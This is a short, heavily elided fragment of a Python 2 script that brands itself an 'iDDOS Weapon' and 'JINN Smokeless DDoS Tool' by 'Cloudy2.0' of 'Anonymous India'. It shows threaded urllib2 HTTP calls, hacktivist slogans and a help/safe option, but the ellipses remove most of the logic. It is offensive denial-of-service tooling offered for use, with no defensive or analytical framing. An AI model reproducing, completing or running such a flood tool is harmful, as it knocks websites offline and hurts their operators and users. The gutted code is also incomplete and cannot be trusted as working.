...
# 
#
# author : Cloudy2.0, Price Anon,ANONYMOUS_INDIA version 3.0
# ----------------------------------------------------------------------------------------------
import urllib2
import sys
import threading
...
8o888        
iDDOS Weapon by ----> Anonymous India
coded by -----------> Cloudy 2.0
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
			print "::We made from smokeless fire #Expect Us::->Cloudy2.0"
			code=500
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "JINN Smokeless DDoS Tool "
		print """Developed By CLoudy2.0
			Command Executed: Wait 60 Seconds, The Traceback's Will Auto Terminate!
"""
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
